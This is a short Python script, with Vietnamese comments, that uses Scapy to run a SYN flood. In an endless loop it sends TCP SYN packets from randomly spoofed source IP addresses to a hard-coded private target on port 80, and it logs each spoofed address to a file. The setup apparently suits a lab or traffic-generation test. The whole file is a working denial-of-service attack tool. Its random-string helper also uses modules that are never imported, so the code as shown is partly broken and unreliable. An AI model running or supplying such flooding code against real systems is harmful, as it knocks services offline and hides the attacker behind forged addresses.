from os import system
from sys import stdout
from scapy.all import *
from random import randint
import socket
import time

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = randint(1000,9000)
	return x

def generate_random_string():
    length = random.randint(10, 40)  # Chọn ngẫu nhiên độ dài từ 10 đến 40
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(characters, k=length)).encode()

def randCount():
	x = randint(2,12)
	return x

def SYN_Flood(count, dstIP, dstPort, source_IP, source_port):
	for i in range(0,count):
		payload_data = generate_random_string()
		
		IP_Packet = IP()
		IP_Packet.src = source_IP
		IP_Packet.dst = dstIP
		TCP_Packet = TCP()
		TCP_Packet.sport = source_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = randInt()
		TCP_Packet.window = randInt()
		
		send(IP_Packet/TCP_Packet/Raw(payload_data), verbose=False)
		
	# print('source_IP:', source_IP, ' count:', count)
	with open("ip.txt", "a", encoding="utf-8") as file:
			file.write(source_IP + '\n')
	
def main():
    print('Syn Attack')
	

    dstIP = '192.168.200.60' # IP tan cong
    dstPort = 80
    while True:
        time.sleep(2)
        source_IP = randomIP()
        source_port = randInt()

        print(source_IP)

        # source_IP = '192.111.111.111'
        # source_port = 4560

        count = randCount() # so goi tin ngau nhien khi tan cong
        SYN_Flood(count,dstIP,dstPort,source_IP, source_port)
main()